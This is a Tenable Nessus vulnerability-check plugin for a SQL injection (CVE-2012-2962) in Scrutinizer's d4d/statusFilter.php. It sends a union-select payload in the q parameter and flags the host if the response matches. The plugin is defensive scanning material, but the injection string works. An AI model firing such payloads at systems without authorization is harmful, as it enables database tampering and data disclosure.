#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(61598);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2013/05/09 19:43:38 $");

  script_cve_id("CVE-2012-2962");
  script_bugtraq_id(54625);
  script_osvdb_id(84232);
  script_xref(name:"CERT", value:"404051");
  script_xref(name:"EDB-ID", value:"20033");
  script_xref(name:"EDB-ID", value:"20204");

  script_name(english:"Scrutinizer < 9.5.2 d4d/statusFilter.php q Parameter SQL Injection");
  script_summary(english:"Tries to manipulate response based on a SQL query");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts an application that is affected by a SQL
injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Scrutinizer installed on the remote web server is
affected by a SQL injection vulnerability in the q parameter of the
'd4d/statusFilter.php' script. 

An unauthenticated remote attacker can leverage this issue to manipulate
database queries, leading to disclosure of sensitive information,
attacks against the underlying database, and the like."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.plixer.com/Press-Releases/plixer-releases-9-5-2.html");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0671efae");
  script_set_attribute(attribute:"solution", value:"Upgrade to Dell Sonicwall Scrutinizer 9.5.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"SonicWALL Scrutinizer 9.0.1 SQL Injection");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Dell SonicWALL (Plixer) Scrutinizer 9 SQL Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/07/22");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/07/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/08/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:dell:sonicwall_scrutinizer");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2013 Tenable Network Security, Inc.");

  script_dependencies("scrutinizer_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/scrutinizer_netflow_sflow_analyzer");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

install = get_install_from_kb(appname:'scrutinizer_netflow_sflow_analyzer', port:port, exit_on_fail:TRUE);
dir = install['dir'];
app_url = build_url(qs:dir, port:port);
appname = 'Scrutinizer Netflow & sFlow Analyzer';

# Try to exploit the issue to manipulate the output.
#url = dir + '/d4d/statusFilter.php?commonJson=protList&q=' + SCRIPT_NAME + "'";
url = dir + "/d4d/statusFilter.php?commonJson=protList&q=a'+union+select+0,'" +
      SCRIPT_NAME + "'+--+";
res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);
expected_response = " 0 (" + SCRIPT_NAME + ")|" + SCRIPT_NAME;
if (chomp(res[2]) == expected_response)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);

  if (report_verbosity > 0)
  {
    report = get_vuln_report(items:url, port:port);
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, app_url);
